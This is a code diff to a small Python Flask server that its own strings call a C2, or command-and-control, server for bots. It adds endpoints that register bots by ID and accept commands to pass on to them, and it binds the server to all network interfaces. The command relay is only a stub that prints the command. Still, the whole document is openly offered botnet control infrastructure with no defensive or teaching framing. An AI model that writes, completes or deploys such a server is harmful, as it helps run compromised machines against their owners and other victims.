@@ -1,23 +1,28 @@
-from flask import Flask, request
+from flask import Flask, request, jsonify
 
 app = Flask(__name__)
-connected_bots = []
+
+botnets = []
 
 @app.route('/')
 def home():
-    return 'Serveur C2 Flask en ligne'
+    return "Serveur C2 Flask en ligne"
 
 @app.route('/connect', methods=['POST'])
-def connect():
-    ip = request.remote_addr
-    if ip not in connected_bots:
-        connected_bots.append(ip)
-        print(f"[+] Nouveau bot connecté : {ip}")
-    return 'OK'
+def connect_bot():
+    data = request.json
+    bot_id = data.get("id")
+    if bot_id and bot_id not in botnets:
+        botnets.append(bot_id)
+        print(f"Bot connecté : {bot_id}")
+    return jsonify({"status": "connected", "commands": []})
 
-@app.route('/bots', methods=['GET'])
-def bots():
-    return {'connected_bots': connected_bots}
+@app.route('/commands', methods=['POST'])
+def send_command():
+    command = request.json.get("command")
+    print(f"Commande reçue à envoyer aux bots : {command}")
 
-if __name__ == '__main__':
-    app.run()
+    return jsonify({"status": "command sent"})
+
+if __name__ == "__main__":
+    app.run(host='0.0.0.0', port=5000)
